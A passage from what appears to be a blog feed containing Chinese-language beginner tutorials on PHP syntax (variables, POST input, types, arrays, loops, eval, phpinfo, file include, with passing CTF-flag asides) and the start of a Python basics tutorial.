title="注释："></a>注释：</h4><hr><p><strong>单行注释：</strong>//</p><p><strong>多行注释：</strong>/**/</p><h4 id="变量："><a href="#变量：" class="headerlink" title="变量："></a>变量：</h4><hr><p>变量以“$”符号开始，后面跟着变量的名称，变量名必须以字母或者下划线开始，变量名只能包含字母，数字，下划线。</p><p>变量名是区分大小写的！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$x</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$y</span>=<span class="number">6</span>;</span><br><span class="line"><span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$z</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67d3b70488c538a9b5bceef9.png" alt=""></p><h4 id="外部变量："><a href="#外部变量：" class="headerlink" title="外部变量："></a>外部变量：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__); <span class="comment">//将php代码显示在网页上</span></span><br><span class="line"><span class="variable">$u</span> = <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]; <span class="comment">//通过POST方法提交数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_POST</span>[<span class="string">&quot;pwd&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$passwd</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67d3bc1988c538a9b5bcf0a3.png" alt=""></p><p><img src="https://pic1.imgdb.cn/item/67d3bc8688c538a9b5bcf0b5.png" alt=""></p><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>程序中的数据种类繁多，可以根据类型不同，分为几大类：</p><pre><code>String（字符串）Integer（整型）Float（浮点型）Boolean（布尔型）Array（数组）Object（对象）NULL（空值）Resour</code></pre><ol><li><strong>字符串</strong></li></ol><p>一个字符串是一串字符的序列，就像 “Hello world!”。</p><p>可以将任何文本放在单引号和双引号中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$x</span> = <span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line">    <span class="variable">$x</span> = <span class="string">&#x27;Hello world!&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><strong>整数</strong></li></ol><p>整数是一个没有小数的数字。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$x</span> = <span class="number">1359</span>;</span><br><span class="line">    <span class="variable">$x</span> = -<span class="number">345</span>; <span class="comment">// 负数 </span></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0x8C</span>; <span class="comment">// 十六进制数</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">047</span>; <span class="comment">// 八进制数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><strong>小数（浮点数）</strong></li></ol><p>浮点数是带小数部分的数字，或是指数形式。</p><p>var_dump() 函数返回变量的数据类型和值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$x</span> = <span class="number">10.365</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">2.4e3</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><strong>布尔</strong></li></ol><p>布尔型可以是 TRUE 或 FALSE，TRUE标识真，FALSE标识假。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$x</span>=<span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$y</span>=<span class="literal">false</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><strong>PHP 对象 (Object)</strong></li></ol><p>对象类型可以用于存储数据，使用class关键字声明类对象，类包含属性和方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//类名</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Car</span></span>&#123;</span><br><span class="line">      <span class="comment">//属性</span></span><br><span class="line">      <span class="keyword">var</span> <span class="variable">$color</span>;</span><br><span class="line">      <span class="comment">//方法</span></span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">fun1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;方法1&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><strong>null值</strong></li></ol><p>NULL 值表示变量没有值，NULL 是数据类型为 NULL 的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$x</span>=<span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line">    <span class="variable">$x</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="数组"><a href="#数组" class="headerlink" title="数组:"></a>数组:</h4><p>数组指数据的组合，能够在单个变量中存储多个值。</p><p>可以将数组看作一个存储数据的盒子，盒子中有很多个格子，每个格子中都可存储一个数据。</p><p>数组名：盒子名</p><p>元素：格子中的数据</p><p>索引：格子的位置</p><p>长度：格子的数量</p><ol><li>创建数组并读取数据</li></ol><p>通过索引读取数组中的元素 ：$数组名[索引];</p><p>索引从0开始。即数组中的第一个元素索引为0，以此类推。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过索引 读取数组中的所有元素  $数组名[索引];</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$cars</span>[0].<span class="subst">$cars</span>[1].<span class="subst">$cars</span>[2]&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>获取数组长度</li></ol><p>count() 函数用于返回数组的长度。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">count</span>(<span class="variable">$cars</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>遍历数组</li></ol><p>遍历指的是读取数组中的所有数据，使用 for 循环：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line">    <span class="variable">$arrlength</span>=<span class="title function_ invoke__">count</span>(<span class="variable">$cars</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="variable">$arrlength</span>;<span class="variable">$x</span>++)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$cars</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="PHP流程控制语句"><a href="#PHP流程控制语句" class="headerlink" title="PHP流程控制语句"></a>PHP流程控制语句</h4><p><strong>if条件控制语句</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(判断语句<span class="number">1</span>)&#123;</span><br><span class="line">   执行语句体<span class="number">1</span></span><br><span class="line">&#125;<span class="keyword">elseif</span>（判断语句<span class="number">2</span>）&#123;</span><br><span class="line">   执行语句体<span class="number">2</span></span><br><span class="line">&#125; <span class="keyword">elseif</span>（判断语句n）&#123;</span><br><span class="line">   执行语句体n</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   最后的<span class="keyword">else</span>语句可选</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>while循环语句</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$i</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$i</span> &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span> ;</span><br><span class="line">    <span class="variable">$i</span>++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>for循环语句</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">5</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span> . <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="局部和全局作用域"><a href="#局部和全局作用域" class="headerlink" title="局部和全局作用域"></a>局部和全局作用域</h4><hr><p>在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用global关键字</p><h4 id="Static作用域："><a href="#Static作用域：" class="headerlink" title="Static作用域："></a>Static作用域：</h4><hr><p>当一个函数完成的时候，它的所有变量通常都会被删除，然而，有时候希望某个变量不要被删除，要做到这一点，请在第一次声明变量的时候使用Static关键字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$s</span>=<span class="number">0</span>; <span class="comment">//删除static关键字后，所有结果都是0</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="variable">$s</span>++;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL; <span class="comment">//换行符</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67d3ba5488c538a9b5bcf04c.png" alt=""></p><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>范例：preg_match(“/[a-zA-Z0-9~-=!\^+()]/“, $a);<br></p><pre><code>整个表达式用 / 包裹，这是正则表达式的开始和结束标记。&lt;br&gt;a-zA-Z0-9: 表示匹配任何大小写字母和数字。 &lt;br&gt;~-=!^+(): 表示匹配波浪号、减号、等号、感叹号、插入符号、加号和括号这些特定的符号。&lt;br&gt;</code></pre><p>在正则表达式中，反斜杠 \ 是一个特殊字符，它用于转义其他字符，使其失去原来的特殊含义，变成普通字符。以下是一些常见的情况，你可能需要使用反斜杠进行转义：<br> 转义特殊字符： 有些字符在正则表达式中具有特殊含义，例如 .、*、+、?、(、)、[、]、{、} 等。如果你想匹配这些字符本身，而不是它们的特殊含义，需要使用反斜杠进行转义。<br></p><h4 id="最常见且关键的函数"><a href="#最常见且关键的函数" class="headerlink" title="最常见且关键的函数"></a>最常见且关键的函数</h4><p><strong><code>preg_match()函数</code></strong>：匹配成功返回1,失败返回0</p><p><code>phpinfo()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>phpinfo是一个函数（功能），这个函数会显示一个当前电脑（服务器）的详细的PHP信息。(有时也会藏flag)</p><p><strong><code>eval()函数：</code></strong></p><p>eval() 是一个在 PHP 中用于执行字符串作为 PHP 代码的函数。eval() 接受一个字符串参数 $code，该字符串包含要执行的 PHP 代码。当 eval() 被调用时，它会将字符串作为 PHP 代码解析并执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>文件包含是一种在编程中将一个文件的内容插入到另一个文件中的技术。在PHP中，文件包含通常使用include、require、include_once、require_once等语句来实现。例如include ‘flag.php’</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python语法基础</title>
      <link href="/2025/02/17/python%E5%9F%BA%E7%A1%80/"/>
      <url>/2025/02/17/python%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-基础语法全面解析"><a href="#Python-基础语法全面解析" class="headerlink" title="Python 基础语法全面解析"></a>Python 基础语法全面解析</h1><h2 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a>格式化输出</h2><h3 id="格式化输出-1"><a href="#格式化输出-1" class="headerlink" title="% 格式化输出"></a>% 格式化输出</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&#x27;czxh&#x27;</span></span><br><span class="line">age = <span class="number">18</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我的姓名：%s 我的年龄：%06d&quot;</span> % (name, age))  <span class="comment"># 输出：我的姓名：czxh 我的年龄：000018</span></span><br><span class="line"></span><br><span class="line">s = <span class="number">4.3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%.6f&quot;</span>%s)  <span class="comment"># 设置小数点位数，输出：4.300000</span></span><br></pre></td></tr></table></figure><h3 id="f-string-格式化输出"><a href="#f-string-格式化输出" class="headerlink" title="f-string 格式化输出"></a>f-string 格式化输出</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;我的名字是<span class="subst">&#123;name&#125;</span>,年龄是<span class="subst">&#123;age&#125;</span>&quot;</span>)  <span class="comment"># 输出：我的名字是czxh,年龄是18</span></span><br></pre></td></tr></table></figure><h3 id="format-方法"><a href="#format-方法" class="headerlink" title="format 方法"></a>format 方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基本用法</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The value is: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">100</span>))  <span class="comment"># 输出：The value is: 100</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; and &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>))  <span class="comment"># 输出：apple and banana</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化数字</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:05d&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">123</span>))  <span class="comment"># 输出：00123</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:.2f&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">3.14159</span>))  <span class="comment"># 输出：3.14</span></span><br></pre></td></tr></table></figure><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">7</span>//<span class="number">2</span>)  <span class="comment"># 取整除，输出：3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">5</span>%<span class="number">2</span>)   <span class="comment"># 取余数，输出：1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">7</span>**<span class="number">2</span>)  <span class="comment"># 幂运算，输出：49</span></span><br></pre></td></tr></table></figure><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">num1 = <span class="number">5</span></span><br><span class="line">num2 = <span class="number">8</span></span><br><span class="line">num3 = num1</span><br><span class="line">num4 = num1 + num2</span><br><span class="line"></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">a = a + <span class="number">1</span></span><br><span class="line">a += <span class="number">1</span>  <span class="comment"># 等价于 a = a + 1</span></span><br></pre></td></tr></table></figure><h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><h3 id="if-判断"><a href="#if-判断" class="headerlink" title="if 判断"></a>if 判断</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;haha1111&quot;</span>)  <span class="comment"># 输出：haha1111</span></span><br></pre></td></tr></table></figure><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;haha&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;heihei&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> a == <span class="string">&#x27;haha&#x27;</span> <span class="keyword">and</span> b == <span class="string">&#x27;heihei&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;666666666&#x27;</span>)  <span class="comment"># 输出：666666666</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> a == <span class="string">&#x27;haha&#x27;</span> <span class="keyword">or</span> b == <span class="string">&#x27;666&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;777777777&#x27;</span>)  <span class="comment"># 输出：777777777</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">not</span> <span class="number">3</span> &lt; <span class="number">9</span>)  <span class="comment"># 输出：False</span></span><br></pre></td></tr></table></figure><h3 id="三目运算"><a href="#三目运算" class="headerlink" title="三目运算"></a>三目运算</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = <span class="string">&quot;真&quot;</span> <span class="keyword">if</span> <span class="number">1</span> == <span class="number">1</span> <span class="keyword">else</span> <span class="string">&quot;假&quot;</span></span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 输出：真</span></span><br></pre></td></tr></table></figure><h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><h3 id="while-循环"><a href="#while-循环" class="headerlink" title="while 循环"></a>while 循环</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;helloworld&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(i)  <span class="comment"># 逐个输出字符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)  <span class="comment"># 输出：1 2 3 4 5</span></span><br></pre></td></tr></table></figure><h2 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h2><h3 id="编码转换"><a href="#编码转换" class="headerlink" title="编码转换"></a>编码转换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">a1 = a.encode()  <span class="comment"># 编码</span></span><br><span class="line">a2 = a1.decode()  <span class="comment"># 解码</span></span><br><span class="line"><span class="built_in">print</span>(a2)  <span class="comment"># 输出：hello</span></span><br></pre></td></tr></table></figure><h3 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;10&quot;</span> + <span class="string">&quot;10&quot;</span>)  <span class="comment"># 字符串拼接，输出：1010</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span> * <span class="number">5</span>)  <span class="comment"># 字符串重复，输出：hellohellohellohellohello</span></span><br></pre></td></tr></table></figure><h3 id="字符串切片"><a href="#字符串切片" class="headerlink" title="字符串切片"></a>字符串切片</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;abcdefghigklmn&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">0</span>:<span class="number">4</span>])    <span class="comment"># 输出：abcd</span></span><br><span class="line"><span class="built_in">print</span>(s[-<span class="number">1</span>:-<span class="number">5</span>:-<span class="number">1</span>])  <span class="comment"># 输出：nmlk</span></span><br></pre></td></tr></table></figure><h2 id="列表操作"><a href="#列表操作" class="headerlink" title="列表操作"></a>列表操作</h2><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">li = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(li[<span class="number">0</span>:<span class="number">3</span>])  <span class="comment"># 输出：[1, 2, 3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表推导式</span></span><br><span class="line">li = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">51</span>) <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">0</span>)]</span><br><span class="line"><span class="built_in">print</span>(li)  <span class="comment"># 输出1-50的偶数列表</span></span><br></pre></td></tr></table></figure><h3 id="列表方法"><a href="#列表方法" class="headerlink" title="列表方法"></a>列表方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span 